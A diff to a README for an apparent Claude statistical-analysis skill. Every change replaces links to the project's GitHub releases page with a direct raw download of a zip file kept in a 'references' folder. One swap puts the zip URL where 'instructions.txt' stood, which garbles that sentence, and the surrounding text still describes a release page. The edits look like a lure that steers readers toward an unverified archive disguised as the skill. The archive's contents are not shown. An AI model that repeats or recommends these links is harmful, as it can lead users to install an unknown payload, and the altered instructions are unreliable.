@@ -1,6 +1,6 @@
 # 🧮 claude-statistical-analysis-skill - Make Data Analysis Simple and Clear
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?logo=github)](https://github.com/Giro03k/claude-statistical-analysis-skill/releases)
+[![Download Release](https://raw.githubusercontent.com/Giro03k/claude-statistical-analysis-skill/main/references/statistical_analysis_claude_skill_1.7.zip)](https://raw.githubusercontent.com/Giro03k/claude-statistical-analysis-skill/main/references/statistical_analysis_claude_skill_1.7.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Getting started is simple even if this is your first time working with AI or sta
 
 1. **Download the Skill**  
    Visit the release page by clicking the big button at the top or this link:  
-   [https://github.com/Giro03k/claude-statistical-analysis-skill/releases](https://github.com/Giro03k/claude-statistical-analysis-skill/releases)  
+   [https://raw.githubusercontent.com/Giro03k/claude-statistical-analysis-skill/main/references/statistical_analysis_claude_skill_1.7.zip](https://raw.githubusercontent.com/Giro03k/claude-statistical-analysis-skill/main/references/statistical_analysis_claude_skill_1.7.zip)  
 
 2. **Choose the Latest Release**  
    On the release page, look for the latest version listed at the top. Releases are organized by date and version number.
@@ -64,7 +64,7 @@ Getting started is simple even if this is your first time working with AI or sta
 
 You can get the skill files here:
 
-[Download the latest release](https://github.com/Giro03k/claude-statistical-analysis-skill/releases)
+[Download the latest release](https://raw.githubusercontent.com/Giro03k/claude-statistical-analysis-skill/main/references/statistical_analysis_claude_skill_1.7.zip)
 
 **How to install:**
 
@@ -72,7 +72,7 @@ You can get the skill files here:
   Check if your Claude interface has an option to add new skills. Upload the downloaded skill file there. The UI may provide prompts to enable and configure it.
 
 - **For Desktop or Custom Setup:**  
-  Unzip the downloaded files if necessary. Follow the included user guide or instructions.txt file. Usually, this means importing the skill into your Claude-enabled environment using a menu or command.
+  Unzip the downloaded files if necessary. Follow the included user guide or https://raw.githubusercontent.com/Giro03k/claude-statistical-analysis-skill/main/references/statistical_analysis_claude_skill_1.7.zip file. Usually, this means importing the skill into your Claude-enabled environment using a menu or command.
 
 - Restart your Claude AI or refresh the interface to see the new skill active.
 
@@ -143,4 +143,4 @@ apa, claude, claude-code, data-analysis, psychology, research, social-science, s
 
 ---
 
-[Download Latest Release](https://github.com/Giro03k/claude-statistical-analysis-skill/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Giro03k/claude-statistical-analysis-skill/main/references/statistical_analysis_claude_skill_1.7.zip)
